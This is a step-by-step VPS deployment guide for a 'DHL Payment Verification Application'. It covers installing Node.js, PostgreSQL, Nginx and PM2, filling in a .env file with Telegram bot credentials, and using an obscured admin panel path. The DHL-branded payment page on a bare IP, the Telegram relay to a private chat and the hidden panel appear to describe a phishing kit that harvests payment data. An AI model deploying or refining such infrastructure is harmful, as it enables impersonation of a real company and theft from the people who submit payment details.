# Deployment Guide for VPS (209.250.233.145)

This guide will help you deploy the DHL Payment Verification Application to your VPS.

## Prerequisites

- Ubuntu/Debian VPS with SSH access
- Root or sudo access
- Domain name (optional) or use IP address directly

## Step 1: Prepare Your VPS

### 1.1 Update System
```bash
sudo apt update
sudo apt upgrade -y
```

### 1.2 Install Node.js (v18 or higher)
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
node --version  # Should show v20.x.x
```

### 1.3 Install PostgreSQL
```bash
sudo apt install -y postgresql postgresql-contrib
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

### 1.4 Install Nginx
```bash
sudo apt install -y nginx
sudo systemctl start nginx
sudo systemctl enable nginx
```

### 1.5 Install PM2 (Process Manager)
```bash
sudo npm install -g pm2
```

### 1.6 Install Git
```bash
sudo apt install -y git
```

## Step 2: Setup PostgreSQL Database

### 2.1 Create Database and User
```bash
sudo -u postgres psql
```

In PostgreSQL prompt:
```sql
CREATE DATABASE dhl_payment_db;
CREATE USER dhl_user WITH ENCRYPTED PASSWORD 'your_strong_password_here';
GRANT ALL PRIVILEGES ON DATABASE dhl_payment_db TO dhl_user;
ALTER DATABASE dhl_payment_db OWNER TO dhl_user;
\q
```

### 2.2 Test Database Connection
```bash
psql -U dhl_user -d dhl_payment_db -h localhost
# Enter password when prompted
# If successful, type \q to exit
```

## Step 3: Deploy Application

### 3.1 Create Application Directory
```bash
sudo mkdir -p /var/www/dhl-payment-app
sudo chown -R $USER:$USER /var/www/dhl-payment-app
cd /var/www/dhl-payment-app
```

### 3.2 Upload Your Application Files

**Option A: Using Git (recommended)**
```bash
# If your code is in a Git repository
git clone <your-repo-url> .
```

**Option B: Using SCP from your local machine**
```bash
# Run this from your local machine (not VPS)
scp -r /path/to/your/project/* user@209.250.233.145:/var/www/dhl-payment-app/
```

**Option C: Using rsync (recommended for updates)**
```bash
# Run this from your local machine
rsync -avz --exclude 'node_modules' --exclude 'dist' --exclude '.git' \
  /path/to/your/project/ user@209.250.233.145:/var/www/dhl-payment-app/
```

### 3.3 Create Environment File
```bash
cd /var/www/dhl-payment-app
cp .env.example .env
nano .env
```

Edit the `.env` file with your actual values:
```env
# ==========================================
# DATABASE CONFIGURATION (Required)
# ==========================================
DATABASE_URL=postgresql://dhl_user:your_strong_password_here@localhost:5432/dhl_payment_db

# ==========================================
# ADMIN AUTHENTICATION (Optional)
# ==========================================
# Set this to auto-create admin password on first setup
# If not set, you'll create password via /admin/setup page
ADMIN_PASSWORD=MySecureAdminPassword123

# ==========================================
# TELEGRAM BOT CONFIGURATION (Optional)
# ==========================================
# Get bot token from @BotFather on Telegram
# Get chat ID from @userinfobot on Telegram
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=123456789

# ==========================================
# SESSION CONFIGURATION (Required)
# ==========================================
SESSION_SECRET=generate_a_random_32_character_string_here

# ==========================================
# SERVER CONFIGURATION (Optional)
# ==========================================
NODE_ENV=production
PORT=5000
```

**Generate a secure SESSION_SECRET:**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

**Configuration Methods:**

You have **two options** to configure Telegram and admin settings:

1. **Option 1: Environment Variables (.env file)** ✅ Recommended for VPS
   - Set `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, and `ADMIN_PASSWORD` in `.env`
   - Configuration is persistent and survives restarts
   - More secure (credentials stored in file, not database)

2. **Option 2: Web Interface (Admin Panel)**
   - Leave Telegram variables empty in `.env`
   - Access `/admin/setup` to create admin password
   - Then access `/admin` to configure Telegram via web interface
   - Settings stored in database

**Note:** Environment variables (`.env`) take priority over database settings.

### 3.4 Install Dependencies
```bash
npm install --production=false
```

### 3.5 Build Application
```bash
npm run build
```

This will:
- Build the frontend (Vite)
- Bundle the backend (esbuild)
- Create a `dist` folder with production files

### 3.6 Run Database Migrations
```bash
npm run db:push
```

### 3.7 Create Logs Directory
```bash
mkdir -p logs
```

## Step 4: Configure PM2

### 4.1 Start Application with PM2
```bash
pm2 start ecosystem.config.cjs
```

### 4.2 Save PM2 Configuration
```bash
pm2 save
```

### 4.3 Setup PM2 to Start on Boot
```bash
pm2 startup
# Follow the command it outputs (usually sudo env PATH=... )
```

### 4.4 Check Application Status
```bash
pm2 status
pm2 logs dhl-payment-app
```

## Step 5: Configure Nginx

### 5.1 Create Nginx Configuration
```bash
sudo nano /etc/nginx/sites-available/dhl-payment-app
```

Copy the content from `nginx.conf.example` and paste it.

### 5.2 Enable Site
```bash
sudo ln -s /etc/nginx/sites-available/dhl-payment-app /etc/nginx/sites-enabled/
```

### 5.3 Test Nginx Configuration
```bash
sudo nginx -t
```

### 5.4 Restart Nginx
```bash
sudo systemctl restart nginx
```

## Step 6: Configure Firewall

### 6.1 Allow HTTP and HTTPS
```bash
sudo ufw allow 22/tcp      # SSH
sudo ufw allow 80/tcp      # HTTP
sudo ufw allow 443/tcp     # HTTPS (if using SSL)
sudo ufw enable
```

## Step 7: Access Your Application

Open your browser and visit:
```
http://209.250.233.145
```

You should see the DHL payment page!

## Step 8: Setup Telegram Bot (Admin Panel)

1. Visit: `http://209.250.233.145/panel-x7k9m2n5`
2. Configure your Telegram Bot Token and Chat ID
3. Test the connection

## Step 9: Optional - Setup SSL with Let's Encrypt

### 9.1 Install Certbot
```bash
sudo apt install -y certbot python3-certbot-nginx
```

### 9.2 Get SSL Certificate
**Note:** You need a domain name for this. If using only IP, skip this step.
```bash
sudo certbot --nginx -d your-domain.com -d www.your-domain.com
```

### 9.3 Auto-renewal
```bash
sudo certbot renew --dry-run
```

## Useful Commands

### View Application Logs
```bash
pm2 logs dhl-payment-app
pm2 logs dhl-payment-app --lines 100
```

### Restart Application
```bash
pm2 restart dhl-payment-app
```

### Stop Application
```bash
pm2 stop dhl-payment-app
```

### View Process Status
```bash
pm2 status
pm2 monit
```

### Update Application
```bash
cd /var/www/dhl-payment-app
git pull  # or upload new files
npm install
npm run build
pm2 restart dhl-payment-app
```

### View Nginx Logs
```bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log
```

### Database Backup
```bash
pg_dump -U dhl_user -h localhost dhl_payment_db > backup_$(date +%Y%m%d).sql
```

### Database Restore
```bash
psql -U dhl_user -h localhost dhl_payment_db < backup_20250111.sql
```

## Troubleshooting

### Application won't start
```bash
pm2 logs dhl-payment-app --err
# Check for errors in logs
```

### Database connection issues
```bash
# Check if PostgreSQL is running
sudo systemctl status postgresql

# Check database credentials in .env file
cat .env

# Test database connection
psql -U dhl_user -d dhl_payment_db -h localhost
```

### Port 5000 already in use
```bash
# Find process using port 5000
sudo lsof -i :5000
# Kill the process
sudo kill -9 <PID>
```

### Nginx not serving the app
```bash
# Check Nginx status
sudo systemctl status nginx

# Test configuration
sudo nginx -t

# View error logs
sudo tail -f /var/log/nginx/error.log
```

## Security Best Practices

1. **Use strong passwords** for database and session secret
2. **Keep system updated**: `sudo apt update && sudo apt upgrade`
3. **Use SSL/HTTPS** in production (Let's Encrypt is free)
4. **Restrict database access** to localhost only
5. **Regular backups** of database
6. **Monitor logs** regularly
7. **Keep dependencies updated**: `npm audit fix`

## Support

If you encounter any issues, check:
1. PM2 logs: `pm2 logs dhl-payment-app`
2. Nginx logs: `sudo tail -f /var/log/nginx/error.log`
3. Database connection: Verify DATABASE_URL in `.env`
4. Firewall: Ensure ports 80/443 are open

---

**Your application should now be running at: http://209.250.233.145** 🎉
